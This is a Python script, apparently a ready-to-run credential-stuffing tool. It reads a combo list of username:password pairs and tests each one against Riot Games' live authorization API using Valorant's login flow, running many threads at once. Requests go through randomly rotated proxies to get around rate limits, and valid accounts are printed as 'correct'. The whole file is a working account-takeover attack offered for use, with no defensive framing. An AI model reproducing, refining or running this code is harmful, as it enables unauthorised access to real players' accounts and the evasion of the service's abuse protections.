import requests, os, random, argparse, requests.exceptions, threading

USER_AGENT = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36"

URL = "https://auth.riotgames.com/api/v1/authorization"

HEADERS = {
            "User-Agent" : USER_AGENT,
            "content-type" : "application/json"}
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
DEFAULT = "\033[00m"

class bruter():
    def __init__(self, combo_path, proxies_path, threads_number, show):
        self.threads_number = int(threads_number)
        self.combo = self.load_combo(combo_path)
        self.proxies = self.load_proxies(proxies_path)
        self.show = show
    def load_combo(self, path):
        print(f"[~] {CYAN}Loading combo..{DEFAULT}\n")
        try:
            with open(path, 'r') as r:
                combo = [c.strip().split(':') for c in r.readlines()]
                return combo
        except FileNotFoundError:
            print(f'[!] Could not find : {RED}{path}{DEFAULT}')
            exit()
        
    def load_proxies(self, path):
        print(f"[~] {CYAN}Loading proxies..{DEFAULT}")
        try:
            with open(path, 'r') as r:
                proxies = [p.strip() for p in r.readlines()]
                return proxies
        except FileNotFoundError:
            print(f"[!] Could not find : {RED}{path}{DEFAULT}")
            exit()

    def checker(self, username, password):
        
        while True:
            try:
                proxy = "https://" + random.choice(self.proxies)

                payload_1 = {
                        "client_id":"prod-xsso-playvalorant",
                        "code_challenge":"a_RtpIpkk7yHNkjEPVTtda67NiS6H_POlzwMsTzBHYk",
                        "code_challenge_method":"S256",
                        "redirect_uri":"https://xsso.playvalorant.com/redirect",
                        "response_type":"code",
                        "scope":"openid account",
                        "state":"53ac765d5f414ddcbd6c2a2f0f"}
                payload_2 = {
                            "type":"auth",
                            "username":username,
                            "password":password,
                            "remember":False,
                            "language":"en_US"
                            }

                s = requests.session()
                res_1 = s.post(URL, headers=HEADERS, json=payload_1, proxies={"https" : proxy}, timeout=4)
                if res_1.status_code != 200:
                    print(f'[!] something went wrong')
                
                res_2 = s.put(URL, headers=HEADERS, json=payload_2, proxies={"https" : proxy}, timeout=4)
                res_2_json = res_2.json()
                if 'error' in res_2_json and res_2_json['error'] == "rate_limited":
                    pass
                elif 'error' in res_2_json and res_2_json['error'] == "auth_failure":
                    if self.show:
                        print(f'[!] {username}:{password} : {RED}incorrect{DEFAULT}')
                    return
                elif res_2_json['type'] == 'response':
                    print(f"[+] {username}:{password} : {YELLOW}correct{DEFAULT}")
                    return
            except requests.exceptions.ConnectTimeout:
                pass
            except requests.exceptions.ProxyError:
                pass
            except requests.exceptions.InvalidProxyURL:
                pass
            except Exception as error:
                print(f"[!] ERROR : {RED}{error}{DEFAULT}")

    def pre_check(self):
        while len(self.combo) >= 1:
            c = self.combo.pop()
            username = c[0]
            password = c[1]

            self.checker(username, password)

    def main(self):
        threads = []
        for i in range(self.threads_number):
            x = threading.Thread(target=self.pre_check)
            x.start()
            threads.append(x)

    
if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--combo', help="path to the combo file.")
    parser.add_argument('-p', '--proxies', help="path to the proxies file.")
    parser.add_argument('-t', '--threads', help="Number of threads to use (default=2)", default=2)
    parser.add_argument('-s', '--show', help="Print Incorrect combo on the screen.", action="store_true")
    args = parser.parse_args()

    if not args.combo or not args.proxies:
        print(f"[!] {RED}Invalid use of arguments{DEFAULT}")
        exit()
    
    print(f"[~]{CYAN} Be patient as there's tons of proxies that don't work.{DEFAULT}\n")
    bruterObj = bruter(args.combo, args.proxies, args.threads, args.show)
    bruterObj.main()